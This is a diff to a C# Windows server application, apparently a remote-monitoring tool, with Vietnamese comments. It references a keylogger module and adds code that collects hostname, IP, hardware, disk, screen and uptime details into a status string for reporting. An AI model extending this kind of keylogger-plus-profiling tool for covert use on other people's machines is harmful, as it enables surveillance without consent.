@@ -16,6 +16,9 @@ using System.Threading;
 using KeyLogger;
 using System.Security;
 using System.Timers;
+using System.Management;
+
+
 namespace ServerApp
 {
     public partial class server : Form
@@ -36,47 +39,76 @@ namespace ServerApp
         public server()
         {
             InitializeComponent();
-            CheckForIllegalCrossThreadCalls = false; // Cho phép truy cập UI từ luồng khác (dùng cẩn thận)
+            CheckForIllegalCrossThreadCalls = false;
             this.FormClosing += new FormClosingEventHandler(server_FormClosing);
 
-            // Khởi tạo Counter cho CPU và RAM
-            try
+            // --- TẠO LUỒNG KHỞI TẠO RIÊNG (FIX LỖI KHỞI ĐỘNG CHẬM) ---
+            Thread initThread = new Thread(() =>
             {
-                // Khởi tạo Counter (vẫn có thể gây delay nhẹ lúc bật app, nhưng chỉ 1 lần)
-                cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
-                ramCounter = new PerformanceCounter("Memory", "Available MBytes");
-
-                // Gọi lần đầu (thường trả về 0) để làm nóng Counter
-                cpuCounter.NextValue();
-
-                // Cấu hình Timer chạy mỗi 1000ms (1 giây)
-                statsTimer = new System.Timers.Timer(1000);
-                statsTimer.Elapsed += UpdateSystemStats; // Gán hàm xử lý
-                statsTimer.AutoReset = true;
-                statsTimer.Enabled = true; // Bắt đầu chạy ngay
-            }
-            catch { }
-
-            try
-            {
-                String hostname = Dns.GetHostName();
-                String os = Environment.OSVersion.ToString();
-                String ipAddr = "Unknown";
-                var host = Dns.GetHostEntry(hostname);
-                foreach (var ip in host.AddressList)
+                try
                 {
-                    if (ip.AddressFamily == AddressFamily.InterNetwork)
-                    {
-                        ipAddr = ip.ToString();
-                        break;
-                    }
-                }
-                // Lưu sẵn định dạng phần đuôi
-                staticInfo = $"|{hostname}|{os}|{ipAddr}";
-            }
-            catch { staticInfo = "|Unknown|Unknown|Unknown"; }
+                    // 1. Khởi tạo Counter (Nặng - mất khoảng 1-2s)
+                    cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
+                    ramCounter = new PerformanceCounter("Memory", "Available MBytes");
+                    cpuCounter.NextValue(); // Làm nóng counter
 
-            // Xóa file log cũ khi khởi động lại server để tránh file bị phình to
+                    // 2. Lấy thông tin Tĩnh (Nặng - do truy xuất WMI và DNS)
+                    String hostname = Dns.GetHostName();
+                    String os = Environment.OSVersion.ToString();
+                    String ipAddr = GetLocalIPAddress(); // Hàm mới bên dưới
+
+                    String cpuName = GetHardwareInfo("Win32_Processor", "Name");       // Hàm mới bên dưới
+                    String gpuName = GetHardwareInfo("Win32_VideoController", "Name"); // Hàm mới bên dưới
+                    String totalRam = GetTotalRAM();
+
+                    // --- THÊM MỚI: Ổ CỨNG & MÀN HÌNH ---
+                    String diskInfo = "";
+                    try
+                    {
+                        List<string> drivesList = new List<string>();
+                        foreach (DriveInfo d in DriveInfo.GetDrives())
+                        {
+                            // Chỉ lấy ổ đĩa đã sẵn sàng (IsReady) và là ổ cứng cố định (Fixed)
+                            // Để tránh lỗi khi gặp ổ CD-ROM hoặc USB chưa cắm
+                            if (d.IsReady && d.DriveType == DriveType.Fixed)
+                            {
+                                long free = d.AvailableFreeSpace / (1024 * 1024 * 1024); // GB
+                                long total = d.TotalSize / (1024 * 1024 * 1024);         // GB
+
+                                // Format ngắn gọn: "C: 50/100GB"
+                                string dName = d.Name.Replace("\\", ""); // Bỏ dấu gạch chéo, C:\ thành C:
+                                drivesList.Add($"{dName} {free}/{total}GB");
+                            }
+                        }
+                        // Nối các ổ lại bằng dấu phẩy. VD: "C: 50/100GB, D: 400/500GB"
+                        diskInfo = string.Join(", ", drivesList);
+                    }
+                    catch { diskInfo = "Unknown"; }
+
+                    if (string.IsNullOrEmpty(diskInfo)) diskInfo = "No Fixed Drives";
+
+                    String screenRes = $"{Screen.PrimaryScreen.Bounds.Width}x{Screen.PrimaryScreen.Bounds.Height}";
+
+                    // Lưu format: |Hostname|OS|IP|CPU_Name|GPU_Name|Total_RAM
+                    staticInfo = $"|{hostname}|{os}|{ipAddr}|{cpuName}|{gpuName}|{totalRam}|{diskInfo}|{screenRes}";
+
+                    // 3. Sau khi lấy xong info thì mới bật Timer cập nhật
+                    statsTimer = new System.Timers.Timer(1000);
+                    statsTimer.Elapsed += UpdateSystemStats;
+                    statsTimer.AutoReset = true;
+                    statsTimer.Enabled = true;
+                }
+                catch (Exception)
+                {
+                    // Nếu lỗi thì gán giá trị mặc định để không crash
+                    staticInfo = "|Unknown|Unknown|Unknown|Generic CPU|Generic GPU|? GB|Unknown|0x0";
+                }
+            });
+
+            initThread.IsBackground = true;
+            initThread.Start(); // Bắt đầu chạy ngầm
+
+            // Xóa file log cũ (Giữ nguyên logic cũ của bạn)
             try
             {
                 if (File.Exists(KeyLogger.appstart.path))
@@ -842,15 +874,56 @@ namespace ServerApp
         }
 
         // --- MODULE SYSTEM INFO ---
+        private string GetHardwareInfo(string table, string property)
+        {
+            try
+            {
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT " + property + " FROM " + table);
+                foreach (ManagementObject obj in searcher.Get())
+                {
+                    return obj[property].ToString(); // Lấy cái đầu tiên tìm thấy
+                }
+            }
+            catch { }
+            return "Unknown Device";
+        }
+
+        private string GetTotalRAM()
+        {
+            try
+            {
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem");
+                foreach (ManagementObject obj in searcher.Get())
+                {
+                    long memKb = long.Parse(obj["TotalVisibleMemorySize"].ToString());
+                    return Math.Round((double)memKb / (1024 * 1024), 0).ToString() + " GB";
+                }
+            }
+            catch { }
+            return "Unknown";
+        }
+
+        private string GetLocalIPAddress()
+        {
+            try
+            {
+                var host = Dns.GetHostEntry(Dns.GetHostName());
+                foreach (var ip in host.AddressList)
+                {
+                    if (ip.AddressFamily == AddressFamily.InterNetwork) return ip.ToString();
+                }
+            }
+            catch { }
+            return "127.0.0.1";
+        }
         private void UpdateSystemStats(Object source, ElapsedEventArgs e)
         {
             try
             {
-                // 1. Vẫn giữ lại phần lấy CPU và RAM (vì số liệu này thay đổi liên tục)
                 float cpu = cpuCounter.NextValue();
                 float ram = ramCounter.NextValue();
 
-                // 2. Vẫn giữ phần lấy Pin (thao tác này nhanh, không sao)
+                // Lấy Pin
                 String battery = "Unknown";
                 try
                 {
@@ -860,9 +933,14 @@ namespace ServerApp
                 }
                 catch { }
 
-                // 3. THAY ĐỔI LỚN Ở ĐÂY:
-                // Thay vì gọi lại Dns.GetHostEntry... ta chỉ cần ghép chuỗi với biến staticInfo đã tạo ở bước 2
-                cachedSystemInfo = $"{cpu:0.0}|{ram}|{battery}" + staticInfo;
+                // Lấy Uptime (Thời gian máy đã chạy) - MỚI
+                TimeSpan uptime = TimeSpan.FromMilliseconds(Environment.TickCount);
+                string uptimeStr = string.Format("{0}d {1}h {2}m", uptime.Days, uptime.Hours, uptime.Minutes);
+
+                // Format chuỗi gửi đi: 
+                // Index: 0   | 1  |   2   |   3  |    4   | 5| 6|    7   |    8   |    9
+                // Data : CPU |RAM |Battery|Uptime|Hostname|OS|IP|CpuName |GpuName |TotalRam
+                cachedSystemInfo = $"{cpu:0.0}|{ram}|{battery}|{uptimeStr}" + staticInfo;
             }
             catch { }
         }
